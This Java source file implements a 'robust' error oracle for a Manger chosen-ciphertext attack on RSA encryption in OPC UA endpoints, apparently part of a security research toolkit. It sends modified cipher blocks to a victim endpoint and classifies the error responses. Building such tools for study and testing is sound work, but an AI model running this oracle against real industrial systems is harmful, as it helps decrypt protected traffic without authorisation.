package attacks.manger.oracle;

import opcua.context.Endpoint;
import opcua.message.ErrorMessage;
import opcua.message.Message;
import opcua.message.parts.MessageType;

import java.io.IOException;
import java.util.function.Predicate;

/**
 * A more robust version of a DistinguishableErrorOracle.
 */
public class RobustDistinguishableErrorOracle extends Oracle {

    private final Predicate<ErrorMessage> lessBPredicate;
    private final Predicate<ErrorMessage> geqBPredicate;
    private final int numAttempts;

    /**
     * This oracle will query the endpoint up to numAttempts times until exactly one of the predicates returns true.
     * @param endpoint Endpoint to attack
     * @param lessBPredicate A predicate that predicts based on an error response, whether "m<B" holds.
     * @param geqBPredicate A predicate that predicts based on an error response, whether "m>=B" holds.
     * @param numAttempts Maximum number of attempts
     * @param validCipherText The valid ciphertext to insert queried cipher blocks into
     * @param blockNumber Which cipher block to replace in the ciphertext
     * @throws OracleException
     */
    public RobustDistinguishableErrorOracle(Endpoint endpoint, Predicate<ErrorMessage> lessBPredicate, Predicate<ErrorMessage> geqBPredicate,
                                      int numAttempts, byte[] validCipherText, int blockNumber) throws OracleException {
        this.lessBPredicate = lessBPredicate;
        this.geqBPredicate = geqBPredicate;
        this.numAttempts = numAttempts;
        try {
            this.setVictimProxy(new VictimProxy(endpoint, validCipherText, blockNumber));
        } catch (IOException e) {
            throw new OracleException(e);
        }
    }

    /**
     * This oracle will query the endpoint up to numAttempts times until exactly one of the predicates returns true. Assumes
     * that the block number is 0
     * @param endpoint Endpoint to attack
     * @param lessBPredicate A predicate that predicts based on an error response, whether "m<B" holds.
     * @param geqBPredicate A predicate that predicts based on an error response, whether "m>=B" holds.
     * @param numAttempts Maximum number of attempts
     * @param validCipherText The valid ciphertext to insert queried cipher blocks into
     * @throws OracleException
     */
    public RobustDistinguishableErrorOracle(Endpoint endpoint, Predicate<ErrorMessage> lessBPredicate, Predicate<ErrorMessage> geqBPredicate,
                                      int numAttempts, byte[] validCipherText) throws OracleException {
        this.lessBPredicate = lessBPredicate;
        this.geqBPredicate = geqBPredicate;
        this.numAttempts = numAttempts;
        try {
            this.setVictimProxy(new VictimProxy(endpoint, validCipherText));
        } catch (IOException e) {
            throw new OracleException(e);
        }
    }

    /**
     * This oracle will query the endpoint up to numAttempts times until exactly one of the predicates returns true
     * @param victimProxy Victim proxy
     * @param lessBPredicate A predicate that predicts based on an error response, whether "m<B" holds.
     * @param geqBPredicate A predicate that predicts based on an error response, whether "m>=B" holds.
     * @param numAttempts Maximum number of attempts
     */
    public RobustDistinguishableErrorOracle(VictimProxy victimProxy, Predicate<ErrorMessage> lessBPredicate, Predicate<ErrorMessage> geqBPredicate, int numAttempts) {
        this.setVictimProxy(victimProxy);
        this.lessBPredicate = lessBPredicate;
        this.geqBPredicate = geqBPredicate;
        this.numAttempts = numAttempts;
    }

    /**
     * This oracle will query the endpoint up to numAttempts times until exactly one of the predicates returns true
     * @param lessBPredicate A predicate that predicts based on an error response, whether "m<B" holds.
     * @param geqBPredicate A predicate that predicts based on an error response, whether "m>=B" holds.
     * @param numAttempts Maximum number of attempts
     */
    public RobustDistinguishableErrorOracle(Predicate<ErrorMessage> lessBPredicate, Predicate<ErrorMessage> geqBPredicate, int numAttempts) {
        this.lessBPredicate = lessBPredicate;
        this.geqBPredicate = geqBPredicate;
        this.numAttempts = numAttempts;
    }

    @Override
    public boolean checkValidity(byte[] cipherBlock) throws OracleException {
        this.incrementQueryCount();
        boolean lessB, geqB;
        for(int i=0; i<numAttempts; i++) {
            Message response = getVictimProxy().sendCipherBlock(cipherBlock).getResponse();
            if(response == null || response.getMessageType() != MessageType.ERR) {
                return true;   //TODO
            }
            lessB = lessBPredicate.test((ErrorMessage)response);
            geqB = geqBPredicate.test((ErrorMessage)response);

            if(lessB ^ geqB) {
                return lessB;
            }
        }
        throw new OracleException("Exceeded maximum number of attempts, unable to decide");
    }
}